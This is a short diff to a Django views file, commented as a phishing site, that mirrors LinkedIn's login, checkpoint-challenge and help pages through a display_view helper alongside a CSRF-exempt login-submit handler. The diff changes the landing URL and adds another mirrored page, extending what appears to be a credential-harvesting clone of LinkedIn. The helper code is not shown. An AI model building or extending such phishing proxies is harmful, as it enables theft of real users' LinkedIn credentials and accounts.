@@ -5,7 +5,7 @@ from .helper import display_view, login_post
 
 # Phishing site
 def index(request):
-    url = 'https://www.linkedin.com/login?fromSignIn=true&amp;trk=guest_homepage-basic_nav-header-signin'
+    url = 'https://www.linkedin.com/?allowUnsupportedBrowser=true'
     return display_view(url)
 
 @csrf_exempt
@@ -18,4 +18,7 @@ def checkpoint_lg_login_submit(request):
 
 def checkpoint_challenge_verify(request):
     url = 'https://www.linkedin.com/checkpoint/challenge/verify'
+    return display_view(url)
+def help_linkedin_answer_4135(request):
+    url = 'https://www.linkedin.com/checkpoint/lg/login-submithelp/linkedin/answer/4135'
     return display_view(url)
